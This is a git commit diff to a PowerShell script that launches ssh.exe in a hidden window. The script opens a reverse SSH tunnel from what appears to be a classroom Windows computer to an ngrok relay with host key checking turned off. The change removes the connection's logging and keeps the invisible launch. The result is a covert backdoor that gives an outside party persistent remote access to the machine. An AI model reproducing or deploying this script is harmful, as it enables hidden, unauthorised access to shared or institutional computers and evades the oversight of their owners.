a11317fb83b9586d09f46dc115d434e617efdaf2
usermants <sanchezguy@proton.me>
2025-09-15 15:53:37 -0300

    Update ssh.ps1

--- ssh.ps1
+++ ssh.ps1
@@ -4,15 +4,8 @@ $sshPath = "C:\Program Files\OpenSSH\ssh.exe"
 # Caminho da chave privada
 $keyPath = "C:\Users\SALA 1 ANO B\.ssh\ssh_key"
 
-# Caminho do arquivo de log
-$logFile = "C:\Users\SALA 1 ANO B\.ssh\ssh_verbose_log.txt"
-
 # Argumentos da conexão SSH
 $arguments = "-i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 u0_a434@0.tcp.sa.ngrok.io -p 17461 -N -vvv"
 
-# Executa o SSH de forma invisível e redireciona saída para o log
-Start-Process -FilePath $sshPath `
-    -ArgumentList $arguments `
-    -RedirectStandardOutput $logFile `
-    -RedirectStandardError $logFile `
-    -WindowStyle Hidden
+# Executa o SSH de forma invisível
+Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden
